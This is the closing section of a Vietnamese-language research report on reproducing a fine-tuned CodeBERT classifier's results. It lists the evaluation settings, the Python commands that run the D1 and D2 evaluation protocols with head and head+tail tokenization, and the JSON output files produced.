Dataset:    D2_dataset/ (629 packages, 1,328 files)
Strategy:   head_tail (256 + 256 tokens)
max_length: 512
batch_size: 32
threshold:  0.9
Evaluated:  2026-05-05T16:07:53 UTC
```

### 11.3 Tái Hiện Kết Quả

Để tái hiện đầy đủ:

```bash
# D1
python -m evaluation.run_d1_protocol \
    --model_id KevinPhamH/codebert-finetuned \
    --repo_path tmp_lamps_jss \
    --output outputs/d1_metrics.json \
    --max_length 400 --batch_size 64

# D2 head
python -m evaluation.run_d2_protocol \
    --model_id KevinPhamH/codebert-finetuned \
    --strategy head \
    --threshold 0.9 \
    --output outputs/d2_baseline_head.json

# D2 head+tail
python -m evaluation.run_d2_protocol \
    --model_id KevinPhamH/codebert-finetuned \
    --strategy head_tail \
    --threshold 0.9 \
    --output outputs/d2_head_tail.json
```

### 11.4 File Output JSON

| File | Mô tả |
|------|-------|
| `outputs/d1_metrics.json` | D1 metrics + performance |
| `outputs/d2_baseline_head.json` | D2 head strategy (full) |
| `outputs/d2_head_tail.json` | D2 head+tail strategy (full) |

---

*Báo cáo được tổng hợp từ dữ liệu thực nghiệm ngày 04–05/05/2026. Repository: github.com/NATuan1208/LAMPS-reproduce-IE105*
